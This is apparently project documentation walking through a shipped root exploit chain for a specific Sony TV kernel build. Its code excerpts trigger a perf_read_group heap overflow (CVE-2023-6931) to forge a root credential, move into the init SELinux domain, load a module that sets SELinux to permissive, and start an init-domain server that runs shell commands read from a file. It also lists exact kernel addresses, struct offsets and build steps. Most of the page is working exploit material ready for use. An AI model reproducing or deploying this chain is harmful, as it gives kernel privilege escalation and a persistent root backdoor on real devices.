# Root chain - code walkthrough

This page walks the shipped v21 chain with code excerpts. The full source is
`exploit/prod_exploit_v21.c`; the module is `module/x90mod.c`.

> The TV is build-specific: firmware `626241`, kernel `4.19.260-ab626241`.
> Addresses are link-time plus the KASLR slide. A mismatch should stop you.

## 1. Stage 1 - shell root (CVE-2023-6931)

The exploit opens a perf group leader with `PERF_FORMAT_GROUP`, then many
siblings. `perf_read_group` writes `values[n] += count` for every sibling while
the `values[]` buffer is sized from a smaller read. The overflow targets the
next kmalloc-2k object, a live netlink socket.

Key constants:

```c
#define NSOCKS 2048
#define FREE_IDX 8
#define NSIB 8446          /* read_size = 2048 */
#define TFD_WS 340         /* (2048 + 0x2a8)/8 - 1 */
#define WS_DELTA (A_WORK_TARGET - A_SOCK_DEF_WRITE)
#define FAKE_OFF 0x3c0     /* values + 2048 - netlink work(0x440) */
#define FAKE_LEN 2048
#define REPAIR_LEN 768
#define NREPAIR 256
#define NSPRAY 1
#define NDRAIN 48
```

The group setup:

```c
a.config = PERF_COUNT_SW_PAGE_FAULTS;
a.read_format = PERF_FORMAT_GROUP;
leader = perf_open(&a, 0, -1, -1);
a.read_format = 0;
for (i = 1; i <= NSIB; i++) {
    fd = perf_open(&a, 0, -1, leader);
    if (i == TFD_WS)
        fd_ws = fd;
}
calibrated = calibrate_counter(fd_ws, WS_DELTA);
```

The counter calibration is exact on purpose: a few counts off lands inside the
target function and panics on the first `setsockopt`.

The heap shape is: netlink spray -> free every 16th socket -> RCU grace period
-> drain kmalloc-2k -> perf `values[]` lands in a hole whose neighbour is a
live netlink socket.

The trigger:

```c
for (i = 0; i < NSOCKS; i++) {
    int val = 1;
    if (nlfd[i] < 0) continue;
    setsockopt(nlfd[i], SOL_SOCKET, SO_SNDBUF, &val, sizeof(val));
    if (getgid() == 0 || getuid() == 0)
        break;
}
```

`sk_write_space` now points at `netlink_sock_destruct_work`; its `sk_destruct`
points at `commit_creds`; the "socket" is the fake cred at `FAKE_OFF`.

Fake cred fields:

```c
put64(fake + FAKE_OFF + 0x00, 0x40000000ULL); /* immortal usage; uid 0 */
put64(fake + FAKE_OFF + 0x28, ~0ULL);         /* cap_inheritable */
put64(fake + FAKE_OFF + 0x30, ~0ULL);         /* cap_permitted */
put64(fake + FAKE_OFF + 0x38, ~0ULL);         /* cap_effective */
put64(fake + FAKE_OFF + 0x40, ~0ULL);         /* cap_bset */
put64(fake + FAKE_OFF + 0x48, ~0ULL);         /* cap_ambient */
put64(fake + FAKE_OFF + OFF_CRED_SECURITY, a_fake_tsec - 4);
put64(fake + FAKE_OFF + OFF_CRED_USER, a_root_user);
put64(fake + FAKE_OFF + OFF_CRED_USER_NS, a_init_user_ns);
put64(fake + FAKE_OFF + OFF_CRED_GROUP_INFO, a_init_groups);
put64(fake + FAKE_OFF + OFF_SK_DESTRUCT, a_commit);
```

The trigger frees an interior pointer (`kfree(X + 0x3c0)`). The next 2k
allocation is a repair send that rewrites the live cred with `fake2`.

## 2. Stage 2 - init domain

The property service socket has an `sk_security_struct` (16 bytes in this
kernel):

```c
u32 sid;       /* shell */
u32 peer_sid;  /* init */
u16 sclass;
```

`CONFIG_NETLABEL` is off, so `cred_sid()` reads `cred->security + 4`. Pointing
the fake cred at `sksec - 4` makes the first checks still see shell; the repair
send then writes `fake2` with `security = sksec`, so the live cred reads
`peer_sid = init`.

```c
put64(fake2 + OFF_CRED_SECURITY, a_fake_tsec);
```

`setresuid(0,0,0)` runs `prepare_creds()` and `selinux_cred_prepare()`, which
does a 24-byte `kmemdup` of the security object and produces a real
`task_security_struct` with `sid = init`. The log is re-opened without
`O_CREAT` because creating a file would consume the 8-byte over-read as
`create_sid`.

## 3. Stage 3 - kernel module

The module is a two-byte write with the runtime `selinux_state` address passed
as two signed 32-bit parameters. It is not a general kernel exploit.

```c
static int addr_lo;
static int addr_hi;
module_param(addr_lo, int, 0);
module_param(addr_hi, int, 0);

static int __init x90_init(void)
{
    unsigned long a;
    volatile unsigned char *p;

    a = ((unsigned long)(unsigned int)addr_hi << 32) |
        (unsigned long)(unsigned int)addr_lo;
    if (!a)
        return 0;
    p = (volatile unsigned char *)a;
    p[0] = 0;   /* selinux_state.disabled: keep labels, only enforce=0 */
    p[1] = 0;   /* selinux_state.enforcing: permissive */
    return 0;
}
```

The module is built against the Sony source/config because
`CONFIG_MODVERSIONS` is on. The CRCs are in `module/sony-Module.symvers`:

```
module_layout   0x690d7734
param_ops_int   0xf5a2f68d
_mcount         0x1fdc7df2
```

The image path:

```c
copy_image("/data/local/tests/x90mod.img", "/data/vendor/x90mod.img");
imgfd = open("/data/vendor/x90mod.img", O_RDONLY);
lc = open("/dev/loop-control", O_RDWR);
lnum = ioctl(lc, LOOP_CTL_GET_FREE);
snprintf(loopdev, sizeof(loopdev), "/dev/block/loop%d", lnum);
loopfd = open(loopdev, O_RDWR);
ioctl(loopfd, LOOP_SET_FD, imgfd);
ioctl(loopfd, LOOP_SET_BLOCK_SIZE, 4096);
mount(loopdev, "/dev/x90mnt", "ext4", MS_RDONLY, NULL);
syscall(SYS_finit_module, mfd, "addr_lo=... addr_hi=...", 0);
```

The image is copied to `/data/vendor` because the kernel loop worker can read
`vendor_data_file`; the inner labels are `vendor_file`, which `init` may load.

## 4. Stage 4 - init-domain server

Simplified excerpt (the full function also logs the context/enforce state and
flushes the log):

```c
static void init_server(void)
{
    const char *cmdpath = "/data/local/tests/x90cmd";
    const char *logpath = "/data/local/tests/x90log";
    char cmd[1024], last[1024];

    lf = open(logpath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    dup2(lf, 1);
    dup2(lf, 2);
    last[0] = 0;
    printf("X90INIT READY\n");
    while (1) {
        fd = open(cmdpath, O_RDONLY);
        n = read(fd, cmd, sizeof(cmd) - 1);
        close(fd);
        if (n > 0) {
            cmd[n] = 0;
            if (strcmp(cmd, last) != 0) {
                strncpy(last, cmd, sizeof(last) - 1);
                p = fork();
                if (p == 0) {
                    execl("/system/bin/sh", "sh", "-c", cmd, NULL);
                    _exit(127);
                }
                waitpid(p, &st, 0);
            }
        }
        usleep(100000);
    }
}
```

The parent stays parked. It holds the repaired credential and the skb. Killing
it or closing its inherited fds can trip the `cgroup_sk_free` teardown panic.

## 5. Address table

All addresses are link-time for `4.19.260-ab626241`; add the KASLR slide.

| Symbol | Address |
|---|---|
| `commit_creds` | `0xffffff80080f3f44` |
| `root_user` | `0xffffff800916a790` |
| `init_user_ns` | `0xffffff800916a5a0` |
| `init_groups` | `0xffffff8009170920` |
| `netlink_proto` | `0xffffff800920fe88` |
| `selinux_state` | `0xffffff80092a4478` |
| `selinux_socket_sendmsg` | `0xffffff8008438bf4` |
| fake tsec (sid 344) | `0xffffff8008b84d78` |
| fake tsec (kernel sid 1) | `0xffffff8008b12304` |
| `netlink_sock_destruct_work` | `0xffffff8008894d7c` |
| `sock_def_write_space` | `0xffffff800881de24` |

Struct offsets:

```c
#define OFF_SK_WMEM_ALLOC   0x144
#define OFF_SK_PROT_CREATOR 0x218
#define OFF_SK_DESTRUCT     0x2c0
#define OFF_SK_FILTER       0x108
#define OFF_CRED_SECURITY   0x78
#define OFF_CRED_USER       0x80
#define OFF_CRED_USER_NS    0x88
#define OFF_CRED_GROUP_INFO 0x90
```

## 6. Build and verify

```sh
cd exploit
aarch64-linux-gnu-gcc -static -O2 -o prod_exploit_v21 prod_exploit_v21.c
cd ..
./tools/verify-exploit.sh
```

The verify script checks the source SHA256 and rebuilds the prebuilt. See
[../exploit/README.md](../exploit/README.md).

## 7. Failure modes worth remembering

- A misaligned `sk_write_space` increment calls
  `netlink_sock_destruct_work+K` and panics. The counter is calibrated before
  the holes are created, and the exploit aborts if calibration fails.
- Closing the real netlink sockets at the wrong time can trigger
  `cgroup_sk_free` with zero `sk_cgrp_data`. Do not kill the parked parent.
- Creating the log after the transition with `O_CREAT` consumes the 8-byte
  over-read as `create_sid`. Create it while still shell and re-open without
  `O_CREAT`.
- A module built against the wrong tree and CRC-patched can hang in
  `ftrace_module_init`.
